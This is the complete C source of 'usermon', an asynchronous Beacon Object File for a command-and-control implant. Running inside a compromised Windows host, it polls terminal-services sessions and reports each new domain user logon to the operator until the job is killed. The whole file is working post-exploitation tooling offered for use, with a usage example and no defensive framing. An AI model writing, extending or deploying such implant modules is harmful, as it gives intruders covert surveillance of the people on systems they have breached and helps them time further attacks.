/*
 * usermon — Async BOF: monitor and record local user login events
 *
 * Polls WTSEnumerateSessionsW, diffs against a snapshot, alerts on new
 * Active sessions with a real DOMAIN\user. Runs until jobkill.
 *
 * Optional args:
 *   int32:interval_ms   poll interval (default 3000, min 500)
 *
 * Example:
 *   usermon
 *   usermon -Interval 5000
 *   jobkill <async_execute_task_uuid>
 */
#include <windows.h>
#include "beacon.h"

#ifndef WTS_CURRENT_SERVER_HANDLE
#define WTS_CURRENT_SERVER_HANDLE ((HANDLE)NULL)
#endif

#ifndef WTSActive
#define WTSActive 0
#endif

#ifndef WTSUserName
#define WTSUserName 5
#endif

#ifndef WTSDomainName
#define WTSDomainName 7
#endif

typedef struct _WTS_SESSION_INFOW {
    DWORD  SessionId;
    LPWSTR pWinStationName;
    DWORD  State;
} WTS_SESSION_INFOW, *PWTS_SESSION_INFOW;

DECLSPEC_IMPORT BOOL  WINAPI WTSAPI32$WTSEnumerateSessionsW(HANDLE hServer, DWORD Reserved, DWORD Version, PWTS_SESSION_INFOW *ppSessionInfo, DWORD *pCount);
DECLSPEC_IMPORT BOOL  WINAPI WTSAPI32$WTSQuerySessionInformationW(HANDLE hServer, DWORD SessionId, DWORD WTSInfoClass, LPWSTR *ppBuffer, DWORD *pBytesReturned);
DECLSPEC_IMPORT VOID  WINAPI WTSAPI32$WTSFreeMemory(PVOID pMemory);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT INT   WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
DECLSPEC_IMPORT INT   __cdecl MSVCRT$_snprintf(CHAR *s, size_t n, const CHAR *fmt, ...);
DECLSPEC_IMPORT INT   __cdecl MSVCRT$strcmp(const CHAR *s1, const CHAR *s2);
DECLSPEC_IMPORT CHAR* __cdecl MSVCRT$strcpy(CHAR *dst, const CHAR *src);


#define MAX_SESSIONS 64
#define USER_KEY_LEN 128

typedef struct _SESSION_ENTRY {
    DWORD sessionId;
    CHAR  userKey[USER_KEY_LEN];
    BOOL  used;
} SESSION_ENTRY;

static VOID WideToAnsi(LPCWSTR w, CHAR *out, INT outLen)
{
    if (!w || !out || outLen <= 0) {
        if (out && outLen > 0)
            out[0] = '\0';
        return;
    }
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, w, -1, out, outLen, NULL, NULL);
    out[outLen - 1] = '\0';
}

static BOOL IsIgnorableUser(const CHAR *domain, const CHAR *user)
{
    if (!user || user[0] == '\0')
        return TRUE;
    if (MSVCRT$strcmp(user, "SYSTEM") == 0)
        return TRUE;
    if (domain && MSVCRT$strcmp(domain, "NT AUTHORITY") == 0 && MSVCRT$strcmp(user, "SYSTEM") == 0)
        return TRUE;
    return FALSE;
}

static VOID BuildUserKey(const CHAR *domain, const CHAR *user, CHAR *out, INT outLen)
{
    if (domain && domain[0] != '\0')
        MSVCRT$_snprintf(out, outLen, "%s\\%s", domain, user);
    else
        MSVCRT$_snprintf(out, outLen, "%s", user);
    out[outLen - 1] = '\0';
}

static VOID ClearSnapshot(SESSION_ENTRY *snap, INT count)
{
    INT i;
    for (i = 0; i < count; i++) {
        snap[i].used = FALSE;
        snap[i].sessionId = 0;
        snap[i].userKey[0] = '\0';
    }
}

static BOOL SnapshotContains(SESSION_ENTRY *snap, INT count, DWORD sessionId, const CHAR *userKey)
{
    INT i;
    for (i = 0; i < count; i++) {
        if (!snap[i].used)
            continue;
        if (snap[i].sessionId == sessionId && MSVCRT$strcmp(snap[i].userKey, userKey) == 0)
            return TRUE;
    }
    return FALSE;
}

static INT CaptureSnapshot(SESSION_ENTRY *snap, INT maxEntries)
{
    PWTS_SESSION_INFOW pSessions = NULL;
    DWORD count = 0;
    DWORD i;
    INT filled = 0;

    ClearSnapshot(snap, maxEntries);

    if (!WTSAPI32$WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &count))
        return 0;

    for (i = 0; i < count && filled < maxEntries; i++) {
        LPWSTR pUser = NULL;
        LPWSTR pDomain = NULL;
        DWORD bytes = 0;
        CHAR userA[64];
        CHAR domainA[64];
        CHAR key[USER_KEY_LEN];

        if (pSessions[i].State != WTSActive)
            continue;

        userA[0] = '\0';
        domainA[0] = '\0';

        if (WTSAPI32$WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, pSessions[i].SessionId, WTSUserName, &pUser, &bytes) && pUser) {
            WideToAnsi(pUser, userA, sizeof(userA));
            WTSAPI32$WTSFreeMemory(pUser);
        }
        bytes = 0;
        if (WTSAPI32$WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, pSessions[i].SessionId, WTSDomainName, &pDomain, &bytes) && pDomain) {
            WideToAnsi(pDomain, domainA, sizeof(domainA));
            WTSAPI32$WTSFreeMemory(pDomain);
        }

        if (IsIgnorableUser(domainA, userA))
            continue;

        BuildUserKey(domainA, userA, key, sizeof(key));
        snap[filled].sessionId = pSessions[i].SessionId;
        MSVCRT$strcpy(snap[filled].userKey, key);
        snap[filled].used = TRUE;
        filled++;
    }

    if (pSessions)
        WTSAPI32$WTSFreeMemory(pSessions);

    return filled;
}

static VOID DiffAndAlert(SESSION_ENTRY *prev, INT prevCount, SESSION_ENTRY *cur, INT curCount)
{
    INT i;
    for (i = 0; i < curCount; i++) {
        if (!cur[i].used)
            continue;
        if (!SnapshotContains(prev, prevCount, cur[i].sessionId, cur[i].userKey)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[usermon] LOGON %s session=%u\n", cur[i].userKey, cur[i].sessionId);
            BeaconWakeup();
        }
    }
}

void go(char * args, int len)
{
    datap parser;
    int intervalMs = 3000;
    HANDLE hStop;
    SESSION_ENTRY *prev = NULL;
    SESSION_ENTRY *cur = NULL;
    SIZE_T snapBytes;
    INT prevCount = 0;
    INT curCount = 0;

    if (len > 0) {
        BeaconDataParse(&parser, args, len);
        if (BeaconDataLength(&parser) >= 4)
            intervalMs = BeaconDataInt(&parser);
    }
    if (intervalMs < 500)
        intervalMs = 500;

    /* Heap snapshots — avoids ___chkstk_ms from large stack frames */
    snapBytes = (SIZE_T)MAX_SESSIONS * sizeof(SESSION_ENTRY);
    prev = (SESSION_ENTRY *)KERNEL32$LocalAlloc(LPTR, snapBytes);
    cur = (SESSION_ENTRY *)KERNEL32$LocalAlloc(LPTR, snapBytes);
    if (!prev || !cur) {
        BeaconPrintf(CALLBACK_ERROR, "[usermon] LocalAlloc failed\n");
        BeaconWakeup();
        goto cleanup;
    }

    hStop = BeaconGetStopJobEvent();

    prevCount = CaptureSnapshot(prev, MAX_SESSIONS);

    BeaconPrintf(CALLBACK_OUTPUT, "[usermon] started (interval=%d ms, baseline_sessions=%d, stopEvent=%p)\n", intervalMs, prevCount, hStop);
    BeaconWakeup();

    for (;;) {
        DWORD waitResult;

        if (hStop == NULL)
            break;

        waitResult = KERNEL32$WaitForSingleObject(hStop, (DWORD)intervalMs);
        if (waitResult == WAIT_OBJECT_0)
            break;

        curCount = CaptureSnapshot(cur, MAX_SESSIONS);
        DiffAndAlert(prev, prevCount, cur, curCount);

        /* Swap snapshots */
        {
            INT i;
            ClearSnapshot(prev, MAX_SESSIONS);
            for (i = 0; i < curCount; i++) {
                prev[i] = cur[i];
            }
            prevCount = curCount;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[usermon] stopped\n");
    BeaconWakeup();

cleanup:
    if (prev)
        KERNEL32$LocalFree(prev);
    if (cur)
        KERNEL32$LocalFree(cur);
}
